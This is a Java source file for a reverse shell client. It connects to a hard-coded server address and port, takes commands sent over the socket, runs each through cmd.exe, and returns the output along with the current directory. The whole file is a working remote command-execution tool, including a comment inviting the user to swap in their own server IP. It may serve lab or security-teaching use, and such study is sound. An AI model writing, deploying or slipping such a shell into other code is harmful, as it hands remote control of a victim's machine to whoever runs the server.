import java.io.*;
import java.net.*;

public class Client {
    private static Socket socket;
    private static BufferedReader in;
    private static BufferedWriter out;

    private static String currentDirectory = System.getProperty("user.dir");

    public static void main(String[] args) {
        String host = "192.168.1.121"; // Change to your server IP
        int port = 9999;

        try {
            System.out.println("[LOG] Starting client...");
            socket = new Socket(host, port);
            System.out.println("[LOG] Connected to " + host + ":" + port);

            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            out = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));

            String command;
            while ((command = in.readLine()) != null) {
                System.out.println("[LOG] Received command: " + command);

                if (command.equalsIgnoreCase("quit")) {
                    System.out.println("[LOG] Closing connection");
                    break;
                }

                String result = executeCommand(command);
                System.out.println("[LOG] Sending result back to server...");

                out.write(result);
                out.flush();
            }

        } catch (Exception e) {
            System.err.println("[ERROR] Client exception: " + e.getMessage());
            e.printStackTrace();
        } finally {
            try {
                if (socket != null) socket.close();
                if (in != null) in.close();
                if (out != null) out.close();
                System.out.println("[LOG] Client disconnected.");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private static String executeCommand(String command) {
        StringBuilder output = new StringBuilder();

        try {
            // Handle 'cd' separately
            if (command.toLowerCase().startsWith("cd")) {
                String[] parts = command.split("\\s+", 2);
                if (parts.length > 1) {
                    File newDir = new File(currentDirectory, parts[1]).getCanonicalFile();
                    if (newDir.exists() && newDir.isDirectory()) {
                        currentDirectory = newDir.getAbsolutePath();
                    } else {
                        return "The system cannot find the path specified.\n" + currentDirectory + "> \n[END_OF_OUTPUT]\n";
                    }
                }
                return currentDirectory + "> \n[END_OF_OUTPUT]\n";
            }

            // Execute normal commands
            ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", command);
            builder.directory(new File(currentDirectory));
            builder.redirectErrorStream(true);
            Process process = builder.start();

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println("[LOG] Command output: " + line);
                output.append(line).append("\n");
            }

            process.waitFor();
            reader.close();

        } catch (Exception e) {
            output.append("Error executing command: ").append(e.getMessage()).append("\n");
        }

        // Append current directory and end-of-output delimiter
        output.append(currentDirectory).append("> \n");
        output.append("[END_OF_OUTPUT]\n");

        return output.toString();
    }
}
